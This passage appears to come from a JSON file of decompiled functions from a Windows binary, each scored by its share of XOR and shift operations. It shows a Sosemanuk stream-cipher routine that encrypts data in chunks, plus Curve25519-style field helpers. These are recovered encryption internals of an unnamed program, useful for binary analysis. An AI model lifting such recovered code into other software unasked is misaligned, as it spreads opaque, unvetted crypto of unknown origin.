= v572 ^ v574;\n  v577 = __ROL4__(v572 ^ (v575 | ~(v576 ^ v571)), 13);\n  v578 = __ROL4__(v572 ^ v575 & v576, 3);\n  v579 = __ROL4__(v577 ^ v578 ^ v573, 1);\n  v580 = __ROL4__((8 * v577) ^ v578 ^ v575, 7);\n  v581 = __ROL4__(v580 ^ v578 ^ (v579 << 7), 22);\n  v582 = v915[64] ^ __ROL4__(v580 ^ v579 ^ v577, 5);\n  v583 = v915[65] ^ v579;\n  v584 = v915[66] ^ v581;\n  v585 = v915[67] ^ v580;\n  v586 = v585 ^ v582;\n  v587 = v583 & (v585 ^ v582);\n  v588 = v584 ^ v583;\n  v589 = v582 ^ v587;\n  v590 = v588 ^ (v582 | v585);\n  v591 = v586 ^ v588;\n  v592 = v584 ^ v586;\n  v593 = (v589 | ~v591) ^ (v592 | v590);\n  v594 = __ROL4__(v593 ^ v589 ^ v592, 13);\n  v595 = __ROL4__(v591 ^ (v589 | v584), 3);\n  v596 = __ROL4__(v594 ^ v595 ^ v593, 1);\n  v597 = __ROL4__((8 * v594) ^ v595 ^ v590, 7);\n  v598 = __ROL4__(v597 ^ v596 ^ v594, 5);\n  v599 = __ROL4__(v597 ^ v595 ^ (v596 << 7), 22);\n  v600 = v915[69] ^ v596;\n  v601 = v915[71] ^ v597;\n  v602 = ~(v915[68] ^ v598);\n  v603 = ~(v602 & v600 ^ v915[70] ^ v599);\n  v604 = v601 | v602 & v600;\n  v605 = v603 ^ v601;\n  v606 = v604 ^ v600;\n  v607 = v602 ^ v604;\n  v608 = v606 | v602;\n  v609 = v605 ^ v606;\n  v610 = v608 & (v607 | v603);\n  v611 = v609 ^ v607;\n  v612 = __ROL4__(v605, 3);\n  v613 = v611 ^ v612 ^ v610 & v609;\n  v614 = v610 & v611;\n  v615 = __ROL4__(v610, 13);\n  v616 = __ROL4__(v615 ^ v614 ^ v612 ^ v608, 1);\n  v617 = __ROL4__((8 * v615) ^ v613, 7);\n  v915[130] = __ROL4__(v617 ^ v616 ^ v615, 5);\n  v915[124] = v616;\n  v915[131] = __ROL4__((v616 << 7) ^ v617 ^ v612, 22);\n  v915[125] = v617;\n  v618 = v915[73] ^ v616;\n  v619 = v915[75] ^ v617;\n  v620 = v619 ^ (v915[72] ^ v915[130]) & (v915[74] ^ v915[131]);\n  v621 = v620 ^ v618 ^ v915[74] ^ v915[131];\n  v622 = v618 ^ (v915[72] ^ v915[130] | v619);\n  v623 = v621 ^ v915[72] ^ v915[130];\n  v624 = v620 ^ (v622 | v623);\n  v625 = v623 ^ v622 & v620;\n  v626 = __ROL4__(v621, 13);\n  v627 = __ROL4__(v624 ^ v625 ^ v622, 3);\n  v628 = __ROL4__(v627 ^ v626 ^ v624, 1);\n  v629 = __ROL4__(~(v627 ^ v625 ^ (8 * v626)), 7);\n  v630 = __ROL4__(v629 ^ v627 ^ (v628 << 7), 22);\n  v631 = v915[76] ^ __ROL4__(v629 ^ v628 ^ v626, 5);\n  v632 = v915[77] ^ v628;\n  v633 = v915[78] ^ v630;\n  v634 = v915[79] ^ v629;\n  v635 = v634 | v631;\n  v636 = v632 ^ v634;\n  v637 = v631 & v632;\n  v638 = v633 ^ v631;\n  v639 = v636 ^ v633;\n  v640 = v635 & v636 ^ (v637 | v638);\n  v641 = v637 ^ v635;\n  v642 = v639 ^ (v641 | v640 ^ v637);\n  v643 = __ROL4__(v641 ^ v642 & ~v640, 13);\n  v644 = __ROL4__(v640, 3);\n  v645 = __ROL4__(v643 ^ v644 ^ v642, 1);\n  v646 = __ROL4__((8 * v643) ^ v644 ^ v639 ^ v641 & v638, 7);\n  v647 = __ROL4__(v646 ^ v645 ^ v643, 5);\n  v648 = __ROL4__(v646 ^ v644 ^ (v645 << 7), 22);\n  v649 = v915[81] ^ v645;\n  v650 = v915[83] ^ v646;\n  v651 = v649 ^ v650;\n  v652 = ~v650;\n  v653 = v652 ^ v915[82] ^ v648;\n  v654 = v652 ^ v915[80] ^ v647;\n  v655 = v653 ^ v651 & v654;\n  v656 = v654 ^ v651;\n  v657 = ~v649;\n  v658 = v656 & v653;\n  v659 = v658 ^ v649;\n  v660 = v657 ^ v658;\n  v661 = v655 & v657;\n  v662 = v654 ^ v661;\n  v663 = v655 | v656;\n  v664 = __ROL4__(v655, 13);\n  v665 = __ROL4__(v659 ^ (v661 | v654), 3);\n  v666 = __ROL4__(v665 ^ v662 & v660 ^ v664 ^ v661 ^ v663, 1);\n  v667 = __ROL4__(v665 ^ v662 ^ (8 * v664), 7);\n  v668 = __ROL4__(v666 ^ v667 ^ v664, 5);\n  v669 = __ROL4__((v666 << 7) ^ v667 ^ v665, 22);\n  v670 = v915[85] ^ v666;\n  v671 = v915[87] ^ v667;\n  v672 = v670 ^ v915[84] ^ v668;\n  v673 = v671 ^ v670;\n  v674 = ~v671;\n  v675 = v674 ^ v915[86] ^ v669;\n  v676 = v675 ^ v673 & v672;\n  v677 = v673 | v675;\n  v678 = v672 ^ v676 & v674;\n  v679 = ~(v676 ^ v677 ^ v670);\n  v680 = v679 ^ v672 & v678;\n  v681 = v678 | v679;\n  v682 = __ROL4__(v676, 13);\n  v683 = __ROL4__(v680, 3);\n  v684 = __ROL4__(v683 ^ v682 ^ v678, 1);\n  v685 = __ROL4__(~(v683 ^ v681 ^ (8 * v682) ^ v672 ^ v677), 7);\n  v686 = v915[88] ^ __ROL4__(v685 ^ v684 ^ v682, 5);\n  v687 = v915[90] ^ __ROL4__(v685 ^ v683 ^ (v684 << 7), 22);\n  v688 = v915[91] ^ v685;\n  v689 = v688 & v686;\n  v690 = v688 ^ v686;\n  v691 = ~v687 ^ v689;\n  v692 = v691 ^ v915[89] ^ v684;\n  v693 = v690 ^ (v688 | ~v687);\n  v694 = v692 | v690;\n  v695 = v692 ^ v693;\n  v696 = v695 ^ (v691 | v694);\n  v697 = v696 ^ v694 ^ v688 ^ v691;\n  v698 = __ROL4__(v696, 13);\n  v699 = v697 & v695;\n  v700 = __ROL4__(v697, 3);\n  v701 = __ROL4__(v700 ^ v698 ^ v692, 1);\n  v702 = __ROL4__((8 * v698) ^ v687 ^ v699 ^ v700 ^ v689, 7);\n  v703 = __ROL4__(v702 ^ v700 ^ (v701 << 7), 22);\n  v704 = v915[92] ^ __ROL4__(v702 ^ v701 ^ v698, 5);\n  v705 = v915[93] ^ v701;\n  v706 = v915[94] ^ v703;\n  v707 = v915[95] ^ v702;\n  v708 = v707 ^ (v705 | v706);\n  v709 = v706 ^ v708;\n  v710 = v704 & (v707 | v705 ^ v706);\n  v711 = v705 ^ v708;\n  v712 = v708 ^ v710;\n  v713 = v704 ^ (v705 | v708);\n  v714 = v709 ^ (v711 | v704);\n  v715 = v711 ^ v713;\n  v716 = __ROL4__(v711 ^ (v714 | ~(v715 ^ v709)), 13);\n  v717 = __ROL4__(v711 ^ v714 & v715, 3);\n  v718 = __ROL4__(v716 ^ v717 ^ v712, 1);\n  v719 = __ROL4__((8 * v716) ^ v717 ^ v714, 7);\n  v915[123] = v915[96] ^ __ROL4__(v719 ^ v718 ^ v716, 5);\n  v915[122] = v915[97] ^ v718;\n  v915[121] = v915[98] ^ __ROL4__(v719 ^ v717 ^ (v718 << 7), 22);\n  v915[120] = v915[99] ^ v719;\n  v720 = v906;\n  v721 = v907;\n  do\n  {\n    v722 = v720 - v721;\n    if ( v722 >= 0x1000 )\n      v722 = 4096i64;\n    v723 = sub_140014A2B(&v905, v722);\n    v725 = v724;\n    v909 = v722;\n    v914 = sub_140014A78(0i64, v722, (__int64)Dst, 0x1000ui64, (__int64)&off_140065780);\n    if ( v725 != v726 )\n    {\n      v862 = \"assertion failed: input.len() == output.len()\";\n      v863 = &off_140065078;\n      v864 = 45i64;\n      goto LABEL_23;\n    }\n    v727 = 0i64;\n    v911 = v723;\n    v910 = v725;\n    while ( v725 != v727 )\n    {\n      v728 = *(_BYTE *)(v723 + v727);\n      v729 = v916;\n      if ( v916 == 80i64 )\n      {\n        v913 = v727;\n        v872 = v728;\n        v870 = v915[125];\n        v884 = v915[128];\n        v730 = v915[131] + (v915[121] ^ v915[128] & -(v915[130] & 1));\n        v731 = __ROL4__(1415926535 * v915[130], 7);\n        v732 = v915[129] ^ Sosemanuk_140064A68[LOBYTE(v915[123])] ^ *(_DWORD *)((char *)Sosemanuk_140064668\n                                                                              + (((unsigned __int64)v915[120] >> 22) & 0x3FC)) ^ (v915[123] >> 8) ^ (v915[120] << 8);\n        v887 = v915[129];\n        v733 = v731 ^ (v730 + v915[129]);\n        v734 = 1415926535 * v730;\n        v735 = v731 + (v915[122] ^ v915[129] & -(v730 & 1));\n        v736 = __ROL4__(v734, 7);\n        v890 = v915[124];\n        v737 = v736 ^ (v735 + v732);\n        v738 = 1415926535 * v735;\n        v896 = v732;\n        v739 = v736 + (v915[123] ^ v732 & -(v735 & 1));\n        v740 = v732 ^ Sosemanuk_140064A68[LOBYTE(v915[124])] ^ *(_DWORD *)((char *)Sosemanuk_140064668\n                                                                         + (((unsigned __int64)v915[121] >> 22) & 0x3FC)) ^ (v915[124] >> 8) ^ (v915[121] << 8);\n        v741 = __ROL4__(v738, 7);\n        v742 = v741 ^ (v739 + v740);\n        v743 = 1415926535 * v739;\n        v744 = v741 + (v915[124] ^ v740 & -(v739 & 1));\n        v894 = v915[126];\n        v745 = (unsigned int)v740 ^ Sosemanuk_140064A68[LOBYTE(v915[125])] ^ *(_DWORD *)((char *)Sosemanuk_140064668\n                                                                                       + (((unsigned __int64)v915[122] >> 22) & 0x3FC)) ^ (v915[125] >> 8) ^ (v915[122] << 8);\n        v746 = __ROL4__(v743, 7);\n        v747 = v746 ^ (v744 + v745);\n        v748 = v747 ^ v733 & v742;\n        v749 = v737 ^ (v733 | v747);\n        v750 = v748 ^ v737 ^ v742;\n        v751 = v750 ^ v733;\n        v752 = v748 ^ (v749 | v751);\n        v753 = v751 ^ v749 & v748;\n        v754 = Sosemanuk_140064A68[LOBYTE(v915[126])] ^ Sosemanuk_140064668[(unsigned __int64)v915[123] >> 24] ^ (v915[126] >> 8) ^ (v915[123] << 8);\n        v901[0] = v915[120] ^ v750;\n        v901[1] = v915[121] ^ v752;\n        v901[2] = v752 ^ v753 ^ v915[122] ^ v749;\n        v901[3] = ~(v915[123] ^ v753);\n        v755 = v915[127];\n        v756 = v745;\n        v879 = v745;\n        v757 = (unsigned int)v745 ^ v754;\n        v758 = sub_14000E988((__int64)&v915[100], 0i64, 0x10ui64, (__int64)&off_140064E68);\n        sub_140019B64(v758, v759, (__int64)v901);\n        v760 = __ROL4__(1415926535 * v744, 7);\n        v761 = v746 + (v870 ^ v756 & -(v744 & 1));\n        v762 = (unsigned int)v757 ^ Sosemanuk_140064A68[(unsigned __int8)v755] ^ Sosemanuk_140064668[v890 >> 24] ^ ((unsigned int)v755 >> 8) ^ ((_DWORD)v890 << 8);\n        v882 = v757;\n        v763 = v760 ^ (v761 + v757);\n        v764 = __ROL4__(1415926535 * v761, 7);\n        v765 = v760 + (v894 ^ v757 & -(v761 & 1));\n        v766 = (unsigned int)v762 ^ Sosemanuk_140064A68[(unsigned __int8)v884] ^ Sosemanuk_140064668[v870 >> 24] ^ ((unsigned int)v884 >> 8) ^ ((_DWORD)v870 << 8);\n        v767 = v764 ^ (v765 + v762);\n        v768 = __ROL4__(1415926535 * v765, 7);\n        v769 = v764 + (v755 ^ v762 & -(v765 & 1));\n        v770 = (unsigned int)v766 ^ Sosemanuk_140064A68[(unsigned __int8)v887] ^ Sosemanuk_140064668[v894 >> 24] ^ ((unsigned int)v887 >> 8) ^ ((_DWORD)v894 << 8);\n        v771 = v768 ^ (v769 + v766);\n        v892 = __ROL4__(1415926535 * v769, 7);\n        LODWORD(v757) = Sosemanuk_140064A68[(unsigned __int8)v896] ^ Sosemanuk_140064668[v755 >> 24] ^ ((unsigned int)v896 >> 8) ^ ((_DWORD)v755 << 8);\n        v772 = v768 + (v884 ^ v766 & -(v769 & 1));\n        v773 = v892 ^ (v772 + v770);\n        v774 = v773 ^ v763 & v771;\n        v775 = v774 ^ v767 ^ v771;\n        v776 = v767 ^ (v763 | v773);\n        v777 = v775 ^ v763;\n        v778 = v774 ^ (v776 | v777);\n        v779 = v777 ^ v776 & v774;\n        v902[0] = v890 ^ v775;\n        v902[1] = v870 ^ v778;\n        v902[2] = v778 ^ v779 ^ v894 ^ v776;\n        v902[3] = ~(v755 ^ v779);\n        LODWORD(v757) = v770 ^ v757;\n        v780 = v770;\n        v876 = v770;\n        v781 = sub_14000E988((__int64)&v915[100], 0x10ui64, 0x20ui64, (__int64)&off_140064E80);\n        sub_140019B64(v781, v782, (__int64)v902);\n        v783 = __ROL4__(1415926535 * v772, 7);\n        v784 = v892 + (v887 ^ v780 & -(v772 & 1));\n        v785 = (unsigned int)v757 ^ Sosemanuk_140064A68[(unsigned __int8)v740] ^ Sosemanuk_140064668[v884 >> 24] ^ ((unsigned int)v740 >> 8) ^ ((_DWORD)v884 << 8);\n        v891 = (unsigned int)v757;\n        v786 = v783 ^ (v784 + v757);\n        v787 = __ROL4__(1415926535 * v784, 7);\n        v788 = v783 + (v896 ^ v757 & -(v784 & 1));\n        v789 = (unsigned int)v785 ^ Sosemanuk_140064A68[(unsigned __int8)v879] ^ Sosemanuk_140064668[v887 >> 24] ^ ((unsigned int)v879 >> 8) ^ ((_DWORD)v887 << 8);\n        v871 = v785;\n        v790 = v787 ^ (v788 + v785);\n        v791 = __ROL4__(1415926535 * v788, 7);\n        v792 = v787 + (v740 ^ v785 & -(v788 & 1));\n        LODWORD(v785) = v789 ^ Sosemanuk_140064A68[(unsigned __int8)v882] ^ Sosemanuk_140064668[v896 >> 24] ^ ((unsigned int)v882 >> 8) ^ ((_DWORD)v896 << 8);\n        v895 = v789;\n        v793 = v791 ^ (v792 + v789);\n        v794 = __ROL4__(1415926535 * v792, 7);\n        LODWORD(v755) = Sosemanuk_140064A68[(unsigned __int8)v762] ^ Sosemanuk_140064668[v740 >> 24] ^ ((unsigned int)v762 >> 8) ^ ((_DWORD)v740 << 8);\n        v795 = v791 + (v879 ^ v789 & -(v792 & 1));\n        v796 = v794 ^ (v795 + v785);\n        v797 = v796 ^ v786 & v793;\n        v798 = v797 ^ v790 ^ v793;\n        v799 = v790 ^ (v786 | v796);\n        v800 = v798 ^ v786;\n        v801 = v797 ^ (v799 | v800);\n        v802 = v800 ^ v799 & v797;\n        v903[0] = v884 ^ v798;\n        v903[1] = v887 ^ v801;\n        v903[2] = v801 ^ v802 ^ v896 ^ v799;\n        v903[3] = ~(v740 ^ v802);\n        LODWORD(v755) = v785 ^ v755;\n        v803 = v785;\n        v897 = v785;\n        v804 = sub_14000E988((__int64)&v915[100], 0x20ui64, 0x30ui64, (__int64)&off_140064E98);\n        sub_140019B64(v804, v805, (__int64)v903);\n        v806 = __ROL4__(1415926535 * v795, 7);\n        v807 = v794 + (v882 ^ v803 & -(v795 & 1));\n        v808 = v755 ^ Sosemanuk_140064A68[(unsigned __int8)v766] ^ Sosemanuk_140064668[v879 >> 24] ^ ((unsigned int)v766 >> 8) ^ ((_DWORD)v879 << 8);\n        LODWORD(v887) = v755;\n        LODWORD(v755) = v806 ^ (v807 + v755);\n        v809 = __ROL4__(1415926535 * v807, 7);\n        v810 = v806 + (v762 ^ v887 & -(v807 & 1));\n        v811 = v808 ^ Sosemanuk_140064A68[(unsigned __int8)v876] ^ Sosemanuk_140064668[v882 >> 24] ^ ((unsigned int)v876 >> 8) ^ ((_DWORD)v882 << 8);\n        LODWORD(v884) = v808;\n        v812 = v809 ^ (v810 + v808);\n        v813 = __ROL4__(1415926535 * v810, 7);\n        v814 = v809 + (v766 ^ v808 & -(v810 & 1));\n        v815 = v811 ^ Sosemanuk_140064A68[(unsigned __int8)v891] ^ Sosemanuk_140064668[v762 >> 24] ^ ((unsigned int)v891 >> 8) ^ ((_DWORD)v762 << 8);\n        LODWORD(v896) = v811;\n        v816 = v813 ^ (v814 + v811);\n        v817 = 1415926535 * v814;\n        v818 = v876 ^ v811 & -(v814 & 1);\n        v893 = __ROL4__(v817, 7);\n        v819 = Sosemanuk_140064A68[(unsigned __int8)v871] ^ Sosemanuk_140064668[v766 >> 24] ^ ((unsigned int)v871 >> 8) ^ ((_DWORD)v766 << 8);\n        v820 = v813 + v818;\n        v821 = v893 ^ (v820 + v815);\n        v822 = v821 ^ v755 & v816;\n        v823 = v822 ^ v812 ^ v816;\n        v824 = v812 ^ (v755 | v821);\n        LODWORD(v755) = v823 ^ v755;\n        v825 = v822 ^ (v824 | v755);\n        v826 = v755 ^ v824 & v822;\n        v904[0] = v879 ^ v823;\n        v904[1] = v825 ^ v882;\n        v904[2] = v825 ^ v826 ^ v762 ^ v824;\n        v904[3] = ~(v766 ^ v826);\n        v912 = v815;\n        v827 = v815 ^ v819;\n        v828 = sub_14000E988((__int64)&v915[100], 0x30ui64, 0x40ui64, (__int64)&off_140064EB0);\n        sub_140019B64(v828, v829, (__int64)v904);\n        LODWORD(v882) = __ROL4__(1415926535 * v820, 7);\n        v830 = v893 + (v891 ^ v815 & -(v820 & 1));\n        LODWORD(v755) = v827 ^ Sosemanuk_140064A68[(unsigned __int8)v895] ^ Sosemanuk_140064668[v876 >> 24] ^ ((unsigned int)v895 >> 8) ^ ((_DWORD)v876 << 8);\n        LODWORD(v815) = v830 + v827;\n        v831 = 1415926535 * v830;\n        v832 = v882 + (v871 ^ v827 & -(v830 & 1));\n        v833 = __ROL4__(v831, 7);\n        LODWORD(v766) = v755 ^ Sosemanuk_140064A68[(unsigned __int8)v897] ^ Sosemanuk_140064668[v891 >> 24] ^ (v897 >> 8) ^ ((_DWORD)v891 << 8);\n        v834 = v832 + v755;\n        v835 = 1415926535 * v832;\n        v836 = v833 + (v895 ^ v755 & -(v832 & 1));\n        v837 = __ROL4__(v835, 7);\n        v838 = v836 + v766;\n        LODWORD(v879) = 1415926535 * v836;\n        v839 = v837 + (v897 ^ v766 & -(v836 & 1));\n        v840 = v837 ^ v838;\n        LODWORD(v879) = __ROL4__(v879, 7);\n        v841 = v833 ^ v834;\n        v842 = v766 ^ Sosemanuk_140064A68[(unsigned __int8)v887] ^ Sosemanuk_140064668[v871 >> 24] ^ ((_DWORD)v871 << 8) ^ ((unsigned int)v887 >> 8);\n        LODWORD(v762) = Sosemanuk_140064A68[(unsigned __int8)v884] ^ Sosemanuk_140064668[v895 >> 24] ^ ((unsigned int)v884 >> 8) ^ ((_DWORD)v895 << 8);\n        LODWORD(v815) = v882 ^ v815;\n        v843 = v879 ^ (v839 + v842);\n        v844 = v843 ^ v815 & v840;\n        v845 = v844 ^ v841 ^ v840;\n        v846 = v841 ^ (v815 | v843);\n        LODWORD(v815) = v845 ^ v815;\n        v847 = v844 ^ (v846 | v815);\n        v848 = v815 ^ v846 & v844;\n        LODWORD(v898) = v876 ^ v845;\n        DWORD1(v898) = v847 ^ v891;\n        DWORD2(v898) = v847 ^ v848 ^ v871 ^ v846;\n        HIDWORD(v898) = ~(v895 ^ v848);\n        v849 = sub_14000E988((__int64)&v915[100], 0x40ui64, 0x50ui64, (__int64)&off_140064EC8);\n        sub_140019B64(v849, v850, (__int64)&v898);\n        v729 = 0i64;\n        v728 = v872;\n        v727 = v913;\n        v915[120] = v897;\n        v915[121] = v887;\n        v915[122] = v884;\n        v723 = v911;\n        v915[123] = v896;\n        v915[124] = v912;\n        v725 = v910;\n        v915[125] = v827;\n        v915[126] = v755;\n        v915[127] = v766;\n        v915[128] = v842;\n        v915[129] = v842 ^ v762;\n        v915[130] = v839;\n        v915[131] = v879;\n        v916 = 0;\n        v851 = 0;\n      }\n      else\n      {\n        if ( v916 >= 0x50 )\n          sub_14005CD40(v916, 80i64, (__int64)&off_140064EE0);\n        v851 = v916;\n      }\n      v852 = *((_BYTE *)&v915[100] + v729) ^ v728;\n      v916 = v851 + 1;\n      *(_BYTE *)(v914 + v727++) = v852;\n    }\n    v720 = v906;\n    v721 = v907;\n    *(_QWORD *)&v853 = sub_140014A78(0i64, v909, (__int64)Dst, 0x1000ui64, (__int64)&off_140065798);\n    v898 = v853;\n    *(_QWORD *)&v899 = 0i64;\n    v854 = sub_140014A2B(&v898, *((__int64 *)&v853 + 1));\n    v856 = v855;\n    sub_14004E6E3((__int64 *)v900, v855);\n    v857 = *(_QWORD *)v900;\n    v858 = *(_QWORD *)&v900[16];\n    for ( i = 0i64; v856 != i; ++i )\n      *(_BYTE *)(v857 + v858++) = *(_BYTE *)(v854 + i);\n    *(_QWORD *)&v900[16] = v858;\n  }\n  while ( v721 != v720 );\n  result = *(_QWORD *)&v900[16];\n  v861 = (_OWORD *)v908;\n  *(_QWORD *)(v908 + 16) = *(_QWORD *)&v900[16];\n  *v861 = *(_OWORD *)v900;\n  return result;\n}\n// 140014B91: variable 'v9' is possibly undefined\n// 140014BBB: variable 'v11' is possibly undefined\n// 140014BEA: variable 'v13' is possibly undefined\n// 140014C10: variable 'v15' is possibly undefined\n// 140014C34: variable 'v18' is possibly undefined\n// 140014C59: variable 'v21' is possibly undefined\n// 140014C7E: variable 'v24' is possibly undefined\n// 140014CA2: variable 'v27' is possibly undefined\n// 140014CC7: variable 'v30' is possibly undefined\n// 140014CEC: variable 'v33' is possibly undefined\n// 140015D9A: variable 'v288' is possibly undefined\n// 140015DBE: variable 'v291' is possibly undefined\n// 140015DE2: variable 'v294' is possibly undefined\n// 140015E06: variable 'v297' is possibly undefined\n// 140016B28: variable 'v724' is possibly undefined\n// 140016B62: variable 'v726' is possibly undefined\n// 140016E27: variable 'v759' is possibly undefined\n// 140017050: variable 'v782' is possibly undefined\n// 140017266: variable 'v805' is possibly undefined\n// 140017485: variable 'v829' is possibly undefined\n// 140017698: variable 'v850' is possibly undefined\n// 1400177AC: variable 'v853' is possibly undefined\n// 1400177D5: variable 'v855' is possibly undefined\n// 140064650: using guessed type void *off_140064650;\n// 140064668: using guessed type _DWORD Sosemanuk_140064668[256];\n// 140064A68: using guessed type _DWORD Sosemanuk_140064A68[256];\n// 140064E68: using guessed type void *off_140064E68;\n// 140064E80: using guessed type void *off_140064E80;\n// 140064E98: using guessed type void *off_140064E98;\n// 140064EB0: using guessed type void *off_140064EB0;\n// 140064EC8: using guessed type void *off_140064EC8;\n// 140064EE0: using guessed type void *off_140064EE0;\n// 140064EF8: using guessed type void *off_140064EF8;\n// 140064F10: using guessed type void *off_140064F10;\n// 140064F28: using guessed type void *off_140064F28;\n// 140064F40: using guessed type void *off_140064F40;\n// 140064F58: using guessed type void *off_140064F58;\n// 140064F70: using guessed type void *off_140064F70;\n// 140064F88: using guessed type void *off_140064F88;\n// 140064FA0: using guessed type void *off_140064FA0;\n// 140064FB8: using guessed type void *off_140064FB8;\n// 140064FD0: using guessed type void *off_140064FD0;\n// 140064FE8: using guessed type void *off_140064FE8;\n// 140065000: using guessed type void *off_140065000;\n// 140065018: using guessed type void *off_140065018;\n// 140065030: using guessed type void *off_140065030;\n// 140065078: using guessed type void *off_140065078;\n// 140065780: using guessed type char *off_140065780;\n// 140065798: using guessed type char *off_140065798;\n\n"
    },
    {
        "Function": "sub_14004E34B",
        "Total XOR and shift operations": 9,
        "XOR operations": 0,
        "Shift operations": 9,
        "Operation percentage": "64.29%",
        "Function Body": "\n__int64 __fastcall sub_14004E34B(int a1)\n{\n  return ((unsigned int)(((a1 >> 9) - 1) % 100) >> 31)\n       + (((a1 >> 9) - 1) >> 2)\n       + ((((a1 >> 9) - 1) % 400) >> 31)\n       + (a1 & 0x1FF)\n       + ((a1 >> 9) - 1) / 400\n       + ((a1 >> 9) - 1) / -100\n       + 365 * ((a1 >> 9) - 1)\n       + 1721425;\n}\n\n"
    },
    {
        "Function": "sub_14000DF56",
        "Total XOR and shift operations": 10,
        "XOR operations": 10,
        "Shift operations": 0,
        "Operation percentage": "58.82%",
        "Function Body": "\n__int64 __fastcall sub_14000DF56(_QWORD *a1, _QWORD *a2, unsigned __int8 a3)\n{\n  __int64 result; // rax\n  __int64 v4; // r9\n\n  result = -(__int64)a3;\n  v4 = a1[1];\n  *a1 ^= result & (*a1 ^ *a2);\n  a1[1] = v4 ^ result & (v4 ^ a2[1]);\n  a1[2] ^= result & (a1[2] ^ a2[2]);\n  a1[3] ^= result & (a1[3] ^ a2[3]);\n  a1[4] ^= result & (a1[4] ^ a2[4]);\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_14000D4DA",
        "Total XOR and shift operations": 39,
        "XOR operations": 0,
        "Shift operations": 39,
        "Operation percentage": "50.65%",
        "Function Body": "\n__int64 __fastcall sub_14000D4DA(__int64 a1, _QWORD *a2)\n{\n  unsigned __int64 v2; // r8\n  unsigned __int64 v3; // r11\n  unsigned __int64 v4; // rax\n  unsigned __int64 v5; // r10\n  unsigned __int64 v6; // rsi\n  unsigned __int64 v7; // rdi\n  unsigned __int64 v8; // rbx\n  unsigned __int64 v9; // r14\n  __int64 v10; // r8\n  unsigned __int64 v11; // r11\n  unsigned __int64 v12; // rax\n  unsigned __int64 v13; // r10\n  __int64 v14; // rsi\n  unsigned __int64 v15; // rbx\n  unsigned __int64 v16; // r9\n  unsigned __int64 v17; // r8\n  unsigned __int64 v18; // rdx\n  unsigned __int64 v19; // rax\n  __int64 result; // rax\n\n  v2 = a2[1];\n  v3 = a2[2];\n  v4 = a2[3];\n  v5 = a2[4];\n  v6 = v2 >> 51;\n  v7 = v3 >> 51;\n  v8 = v4 >> 51;\n  v9 = v5 >> 51;\n  v10 = (*a2 >> 51) + (v2 & 0x7FFFFFFFFFFFFi64);\n  v11 = v6 + (v3 & 0x7FFFFFFFFFFFFi64);\n  v12 = v7 + (v4 & 0x7FFFFFFFFFFFFi64);\n  v13 = v8 + (v5 & 0x7FFFFFFFFFFFFi64);\n  v14 = 19 * v9 + (*a2 & 0x7FFFFFFFFFFFFi64);\n  v15 = v14 + 19 * ((v13 + ((v12 + ((v11 + ((v10 + ((unsigned __int64)(v14 + 19) >> 51)) >> 51)) >> 51)) >> 51)) >> 51);\n  v16 = v10 + (v15 >> 51);\n  v17 = v11 + (v16 >> 51);\n  v18 = v12 + (v17 >> 51);\n  v19 = v13 + (v18 >> 51);\n  *(_WORD *)a1 = v15;\n  *(_BYTE *)(a1 + 2) = BYTE2(v15);\n  *(_BYTE *)(a1 + 3) = BYTE3(v15);\n  *(_BYTE *)(a1 + 4) = BYTE4(v15);\n  *(_BYTE *)(a1 + 5) = BYTE5(v15);\n  *(_BYTE *)(a1 + 6) = (BYTE6(v15) & 7) + 8 * v16;\n  *(_BYTE *)(a1 + 7) = v16 >> 5;\n  *(_BYTE *)(a1 + 8) = v16 >> 13;\n  *(_BYTE *)(a1 + 9) = v16 >> 21;\n  *(_BYTE *)(a1 + 10) = v16 >> 29;\n  *(_BYTE *)(a1 + 11) = v16 >> 37;\n  *(_BYTE *)(a1 + 12) = (v16 >> 45) & 0x3F | ((_BYTE)v17 << 6);\n  *(_BYTE *)(a1 + 13) = v17 >> 2;\n  *(_BYTE *)(a1 + 14) = v17 >> 10;\n  *(_BYTE *)(a1 + 15) = v17 >> 18;\n  *(_BYTE *)(a1 + 16) = v17 >> 26;\n  *(_BYTE *)(a1 + 17) = v17 >> 34;\n  *(_BYTE *)(a1 + 18) = v17 >> 42;\n  *(_BYTE *)(a1 + 19) = ((v17 & 0x4000000000000i64) != 0) + 2 * v18;\n  *(_BYTE *)(a1 + 20) = v18 >> 7;\n  *(_BYTE *)(a1 + 21) = v18 >> 15;\n  *(_BYTE *)(a1 + 22) = v18 >> 23;\n  *(_BYTE *)(a1 + 23) = v18 >> 31;\n  *(_BYTE *)(a1 + 24) = v18 >> 39;\n  *(_BYTE *)(a1 + 25) = (v18 >> 47) & 0xF | (16 * v19);\n  *(_BYTE *)(a1 + 26) = v19 >> 4;\n  *(_BYTE *)(a1 + 27) = v19 >> 12;\n  *(_BYTE *)(a1 + 28) = v19 >> 20;\n  *(_BYTE *)(a1 + 29) = v19 >> 28;\n  *(_BYTE *)(a1 + 30) = v19 >> 36;\n  result = (v19 >> 44) & 0x7F;\n  *(_BYTE *)(a1 + 31) = result;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_14000E0A4",
        "Total XOR and shift operations": 10,
        "XOR operations": 10,
        "Shift operations": 0,
        "Operation percentage": "40.00%",
        "Function Body": "\n__int64 __fastcall sub_14000E0A4(__int64 *a1, _QWORD *a2, _QWORD *a3, unsigned __int8 a4)\n{\n  __int64 result; // rax\n  __int64 v5; // r9\n  __int64 v6; // r10\n  __int64 v7; // rsi\n  __int64 v8; // rdi\n  __int64 v9; // r8\n\n  result = -(__int64)a4;\n  v5 = *a2 ^ result & (*a2 ^ *a3);\n  v6 = a2[1] ^ result & (a2[1] ^ a3[1]);\n  v7 = a2[2] ^ result & (a2[2] ^ a3[2]);\n  v8 = a2[3] ^ result & (a2[3] ^ a3[3]);\n  v9 = a2[4] ^ result & (a2[4] ^ a3[4]);\n  *a1 = v5;\n  a1[1] = v6;\n  a1[2] = v7;\n  a1[3] = v8;\n  a1[4] = v9;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_14000CAB0",
        "Total XOR and shift operations": 18,
        "XOR operations": 1,
        "Shift operations": 17,
        "Operation percentage": "22.50%",
